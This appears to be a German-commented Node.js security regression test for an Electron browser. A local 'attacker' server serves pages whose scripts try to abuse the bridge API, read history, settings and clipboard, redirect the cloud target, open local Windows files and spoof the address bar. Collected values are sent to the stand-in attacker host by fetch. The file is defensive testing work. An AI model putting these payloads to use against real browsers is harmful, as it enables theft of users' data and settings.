// 3DK Browser — Sicherheitstest. Spielt die Angriffe von damals nochmal durch.
//
//   node tools/sicherheitsprobe.js        (startet Electron selbst)
//   npm run probe
//
// Ein lokaler "Angreifer"-Server stellt fremde Seiten zu. Sie versuchen das,
// was ihnen früher gelang: Browser-Brücke benutzen, Verlauf und Einstellungen
// lesen, Cloud-Ziel umbiegen, Clipboard lesen und schreiben, Berechtigungen
// bekommen, lokale Dateien öffnen, Adressen vortäuschen, Tracker laden und
// Drittanbieter-Cookies setzen.
//
// Zwei Runden, weil es zwei Wege ins Browserfenster gibt:
//   1. fremde Seite frisch geöffnet   → es darf gar keine Brücke geben
//   2. Klick aus der Ergebnisliste    → Brücke hängt am Tab, aber jeder Aufruf
//      muss am Hauptprozess abprallen
// Ausgabe: PASS/FEHLER je Prüfpunkt, Exit-Code 1 bei einem Fehlschlag.

const http = require('http');
const path = require('path');
const { spawn } = require('child_process');

const PORT = 8123;
const BASE = 'http://127.0.0.1:' + PORT;
const FREMDE_DOMAIN = 'http://localhost:' + PORT;
const ROOT = path.join(__dirname, '..');
const EINSTELLUNGEN_DATEI = 'file:///' + path.join(ROOT, 'app', 'chrome', 'settings.html').replace(/\\/g, '/');
const LOKALE_DATEI = 'file:///C:/Windows/win.ini';

let bericht = leererBericht();
let serverHits = [];
let probeZeile = null;

function leererBericht() {
  return { apiVorhanden: 'unbekannt', methoden: [], versuche: {} };
}

const SEITE = `<!doctype html><html lang="de"><meta charset="utf-8"><title>Angreifer</title><body>
<iframe id="d" src="${FREMDE_DOMAIN}/fremde-domain"></iframe>
<img src="https://google-analytics.com/collect?probe=1" alt="">
<img src="https://securepubads.g.doubleclick.net/gampad/adt?probe=1" alt="">
<script>
(async () => {
  const aus = { apiVorhanden: typeof window.api, methoden: [], versuche: {} };
  const warte = (p, ms = 2200) => Promise.race([
    Promise.resolve(p), new Promise((r) => setTimeout(() => r('*** ZEIT ABGELAUFEN ***'), ms))
  ]);
  async function versuch(name, fn) {
    try { aus.versuche[name] = await warte(fn()); }
    catch (e) { aus.versuche[name] = 'ABGELEHNT: ' + String(e && e.message || e).slice(0, 90); }
  }
  if (window.api) {
    aus.methoden = Object.keys(window.api);
    await versuch('verlauf', async () => { const h = await window.api.listHistory(); return (h && h.length) ? 'LEAK: ' + h.length + ' Eintraege' : 'leer'; });
    await versuch('einstellungen', async () => 'LEAK: ' + JSON.stringify(await window.api.getSettings()).slice(0, 100));
    await versuch('cloudUmbiegen', async () => { const s = await window.api.setSettings({ cloud: { url: '${BASE}/boes' } }); return s && s.cloud ? 'LEAK: ' + s.cloud.url : 'leer'; });
    await versuch('clipboardSchreiben', async () => 'LEAK: ' + await window.api.copyText('ANGRIFFS-TEXT'));
    await versuch('lokaleDateiOeffnen', async () => 'LEAK: ' + await window.api.openInNewTab('${LOKALE_DATEI}'));
    await versuch('eigeneSeiteOeffnen', async () => 'LEAK: ' + await window.api.openInNewTab('${EINSTELLUNGEN_DATEI}'));
    await versuch('fensterOeffnen', async () => 'LEAK: ' + await window.api.openInNewWindow('${BASE}/popup'));
    await versuch('cloudSpeichern', async () => 'LEAK: ' + await window.api.cloudSave({ pass: 'a', phrase: 'b' }));
    await versuch('verlaufLoeschen', async () => 'LEAK: ' + await window.api.clearHistory());
  }
  await versuch('clipboardLesen', async () => 'LEAK: ' + JSON.stringify((await navigator.clipboard.readText()).slice(0, 24)));
  await versuch('benachrichtigungen', async () => 'ERGEBNIS: ' + await Notification.requestPermission());
  await versuch('standort', async () => await warte(new Promise((res) => navigator.geolocation.getCurrentPosition(
    () => res('LEAK: Standort erhalten'), (e) => res('abgelehnt (Code ' + e.code + ')'), {})), 1800));
  await versuch('kamera', async () => await navigator.mediaDevices.getUserMedia({ video: true })
    .then(() => 'LEAK: Kamera offen').catch((e) => 'abgelehnt (' + e.name + ')'));
  const fenster = window.open('${BASE}/popup', '_blank');
  aus.versuche.popup = fenster ? 'Popup-Fenster geoeffnet' : 'kein Popup';
  fetch('${BASE}/BERICHT?d=' + encodeURIComponent(JSON.stringify(aus)));
  setTimeout(() => { history.pushState({}, '', '/Gefaelschte-Bank-Adresse'); }, 1500);
  setTimeout(() => { try { location.href = '${LOKALE_DATEI}'; } catch (e) {} }, 3000);
  // Wer nach dem Sprungversuch noch meldet, ist nicht in eine lokale Datei
  // umgeleitet worden (die Seite wäre sonst weg).
  setTimeout(() => { fetch('${BASE}/NOCH-DA'); }, 5200);
})();
</script></body></html>`;

const FREMDER_RAHMEN = `<!doctype html><meta charset="utf-8"><body><script>
try { document.cookie = 'spaeh=1; path=/'; } catch (e) {}
try { document.cookie = 'spaeh2=1; path=/; SameSite=None; Secure'; } catch (e) {}
fetch('${FREMDE_DOMAIN}/FREMDE-COOKIE?wert=' + encodeURIComponent(document.cookie || '(keine Cookies)'));
</script></body>`;

const POPUP = `<!doctype html><meta charset="utf-8"><body>Popup<script>
fetch('${BASE}/POPUP-API?d=' + encodeURIComponent(JSON.stringify({ api: typeof window.api })));
</script></body>`;

const srv = http.createServer((req, res) => {
  const url = decodeURIComponent(req.url || '/');
  serverHits.push(url);
  if (url.startsWith('/BERICHT')) {
    try { Object.assign(bericht, JSON.parse(new URL('http://x' + req.url).searchParams.get('d') || '{}')); }
    catch (e) { console.log('Bericht unlesbar: ' + e.message); }
    res.end('ok'); return;
  }
  if (url.startsWith('/fremde-domain')) { res.setHeader('content-type', 'text/html'); res.end(FREMDER_RAHMEN); return; }
  if (url.startsWith('/popup')) { res.setHeader('content-type', 'text/html'); res.end(POPUP); return; }
  res.setHeader('content-type', 'text/html');
  res.end(SEITE);
});

// ── eine Runde ──────────────────────────────────────────────────────────
function runde(name, viaInternal) {
  bericht = leererBericht();
  serverHits = [];
  probeZeile = null;
  const paketaufbau = Boolean(process.env.PROBE_BIN);
  return new Promise(async (resolve) => {
    const bin = paketaufbau
      ? process.env.PROBE_BIN
      : path.join(ROOT, 'node_modules', '.bin', process.platform === 'win32' ? 'electron.cmd' : 'electron');
    const args = paketaufbau ? [BASE + '/'] : [ROOT];
    const env = { ...process.env, BROWSER_TEST_CONSOLE: '1' };
    if (!paketaufbau) {
      env.BROWSER_PROBE_URL = BASE + '/';
      if (viaInternal) env.BROWSER_PROBE_INTERNAL = 'test';
      else delete env.BROWSER_PROBE_INTERNAL;
    }
    // Bei Pfaden mit Leerzeichen darf kein Shell-Zwischenschalt dazwischen stehen.
    const kind = spawn(bin, args, { cwd: ROOT, shell: paketaufbau ? false : process.platform === 'win32', env });
    kind.stdout.on('data', (buf) => {
      const text = buf.toString();
      for (const zeile of text.split('\n')) {
        const m = /\[3DK\]\[PROBE\] (\{.*\})/.exec(zeile);
        if (m) { try { probeZeile = JSON.parse(m[1]); } catch { /* egal */ } }
        else if (/\[3DK\]\[blockiert\]|Uncaught|Content Security/i.test(zeile)) console.log('    │ ' + zeile.trim().slice(0, 160));
      }
    });
    const warten = (ms) => new Promise((r) => setTimeout(r, ms));
    for (let i = 0; i < 60 && bericht.apiVorhanden === 'unbekannt'; i++) await warten(500);
    for (let i = 0; i < (paketaufbau ? 24 : 40) && !probeZeile; i++) await warten(500);
    await warten(paketaufbau ? 6000 : 1000);
    try { kind.kill(); } catch { /* schon weg */ }
    resolve({ name, bericht: JSON.parse(JSON.stringify(bericht)), hits: serverHits.slice(), probe: probeZeile, paketaufbau });
  });
}

// ── Bewertung ───────────────────────────────────────────────────────────
function prüfe(checks, r) {
  const v = (r.bericht && r.bericht.versuche) || {};
  const abgelehntOderHarmlos = (wert) => !wert || /^(ABGELEHNT|\*\*\*)/.test(String(wert)) ||
    /abgelehnt|denied|verweigert|kein|leer|FEHLER|NotAllowed/i.test(String(wert));
  const add = (name, ok, grund) => checks.push({ name, ok: Boolean(ok), grund: String(grund) });

  add(r.name + ': keine Browser-Brücke auf fremder Seite', r.bericht.apiVorhanden === 'undefined',
    'window.api = ' + r.bericht.apiVorhanden + (r.bericht.methoden.length ? ' — aber alle ' + r.bericht.methoden.length + ' Aufrufe werden geprüft' : ''));
  for (const [key, label] of [
    ['verlauf', 'Verlauf'], ['einstellungen', 'Einstellungen'], ['cloudUmbiegen', 'Cloud-Ziel'],
    ['clipboardSchreiben', 'Clipboard schreiben'], ['clipboardLesen', 'Clipboard lesen'],
    ['lokaleDateiOeffnen', 'lokale Datei'], ['eigeneSeiteOeffnen', 'eigene Settings-Seite'],
    ['fensterOeffnen', 'Fenster öffnen'], ['cloudSpeichern', 'Cloud-Sicherung anstoßen'],
    ['verlaufLoeschen', 'Verlauf löschen'],
  ]) {
    if (v[key] === undefined && r.bericht.apiVorhanden === 'undefined') continue; // nicht ausprobiert, weil keine Brücke
    add(r.name + ': ' + label + ' nicht missbrauchbar', abgelehntOderHarmlos(v[key]), v[key] || 'nicht versucht');
  }
  add(r.name + ': Benachrichtigungen nur mit Nutzerzustimmung', /denied|ABGELEHNT|verweigert/i.test(String(v.benachrichtigungen || '')), v.benachrichtigungen || '—');
  add(r.name + ': Standort nur mit Erlaubnis', /abgelehnt|ABGELEHNT|ZEIT/i.test(String(v.standort || '')), v.standort || '—');
  add(r.name + ': Kamera blockiert', /abgelehnt|ABGELEHNT/i.test(String(v.kamera || '')), v.kamera || '—');
  add(r.name + ': kein Popup-Fenster', /kein Popup/i.test(String(v.popup || '')), v.popup || '—');
  if (r.probe) {
    add(r.name + ': file://-Navigation blockiert', /127\.0\.0\.1:8123/.test(String(r.probe.tabUrl)), 'Tab steht auf ' + r.probe.tabUrl);
    add(r.name + ': Adressleiste bleibt ehrlich', /8123/.test(String(r.probe.bar)), 'Leiste zeigt ' + r.probe.bar);
    add(r.name + ': Tracker blockiert', r.probe.blocked && r.probe.blocked.tracker > 0, JSON.stringify(r.probe.blocked));
    const blockliste = require('../app/blocklist');
    add(r.name + ': Adblock-Liste wirksam', blockliste.isWerbungHost('pagead2.googlesyndication.com') && !blockliste.isWerbungHost('de.wikipedia.org'), '74k Werbe-Hosts geladen');
    add(r.name + ': Profil verschlüsselt (Betriebssystem-Tresor)', r.probe.profile && r.probe.profile.vault === true, JSON.stringify(r.probe.profile));
  } else if (!r.paketaufbau) {
    add(r.name + ': Zustand aus dem Hauptprozess erhalten', false, 'keine [3DK][PROBE]-Zeile');
  }
  // Im ausgelieferten Bau gibt es keine Hauptprozess-Diagnose: der Nachweis
  // läuft über die Seite selbst (sie meldet sich nach dem Umleitungsversuch).
  add(r.name + ': Umleitung in lokale Datei verhindert',
    r.hits.includes('/NOCH-DA') || Boolean(r.probe),
    r.hits.includes('/NOCH-DA') ? 'Seite meldet sich nach dem Sprungversuch erneut' : 'über Hauptprozess belegt');
  const cookieMelodie = (r.hits.find((h) => h.startsWith('/FREMDE-COOKIE')) || '');
  const cookieWert = (/wert=(.*)$/.exec(cookieMelodie) || ['', ''])[1];
  add(r.name + ': Drittanbieter-Cookie abgewehrt', cookieMelodie !== '' && (/keine Cookies/i.test(cookieWert) || cookieWert.trim() === ''),
    cookieMelodie ? 'Rahmen meldet: "' + cookieWert + '"' : 'kein Bericht aus dem fremden Rahmen');
}

function ausgeben(checks) {
  let fehl = 0;
  console.log('\n============= 3DK Browser — Sicherheitstest =============');
  for (const c of checks) {
    console.log((c.ok ? '  PASS   ' : '  FEHLER ') + c.name.padEnd(56) + ' | ' + c.grund.slice(0, 78));
    if (!c.ok) fehl++;
  }
  console.log('');
  console.log(fehl ? '  → ' + fehl + ' von ' + checks.length + ' Prüfpunkten fehlgeschlagen'
    : '  → alle ' + checks.length + ' Prüfpunkte bestanden');
  console.log('=========================================================\n');
  return fehl;
}

srv.listen(PORT, '127.0.0.1', async () => {
  console.log('Angreifer-Server auf ' + BASE);
  const paketaufbau = Boolean(process.env.PROBE_BIN);
  console.log(paketaufbau ? 'Geprüft der ausgelieferte Bau: ' + process.env.PROBE_BIN : 'Geprüft die Entwicklungs-Fassung');
  const checks = [];
  const frisch = await runde('frisch geöffnet', false);
  prüfe(checks, frisch);
  if (!paketaufbau) {
    const intern = await runde('aus Ergebnisliste', true);
    prüfe(checks, intern);
  }
  srv.close();
  const fehl = ausgeben(checks);
  setTimeout(() => process.exit(fehl ? 1 : 0), 200);
});
